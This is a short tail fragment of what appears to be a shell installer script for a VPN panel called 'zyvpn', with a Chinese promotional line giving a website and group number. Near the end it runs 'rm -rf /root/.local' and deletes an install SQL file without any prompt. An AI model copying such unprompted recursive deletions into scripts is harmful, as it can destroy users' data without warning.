官网：zyzyml.cn   交流群：348286869   欢迎你的加入
">>sm.txt
echo
cat sm.txt
echo -e "\033[1;35m=================================================\033[0m"
rm -rf /root/.local
rm -rf /Data/wwwroot/zyvpn/install.sql 
return 1
}
zy
exit